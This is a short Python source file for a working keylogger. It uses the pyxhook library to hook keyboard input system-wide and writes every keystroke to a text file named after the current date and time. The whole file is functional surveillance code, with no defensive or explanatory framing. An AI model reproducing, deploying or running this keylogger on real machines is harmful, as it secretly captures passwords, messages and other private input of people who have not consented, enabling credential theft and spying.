import sys

import pyxhook
import time

FILE = None

def main():
    global FILE
    now = time.localtime()
    filename = str(now.tm_mday) + str(now.tm_mon) + str(now.tm_year) + str(now.tm_hour) + str(now.tm_min) + str(now.tm_sec)
    FILE = open(filename + ".txt", "w")
    start_keylog()

def start_keylog():    
    key_hook = pyxhook.HookManager()
    key_hook.KeyDown = on_key_press
    key_hook.HookKeyboard()

    try:
        key_hook.start()
    except Exception:
        exit(print("Keylogger stopped"))

def on_key_press(event):
    # print(event.Key)
    FILE.write(event.Key)

if __name__ == "__main__":
    main()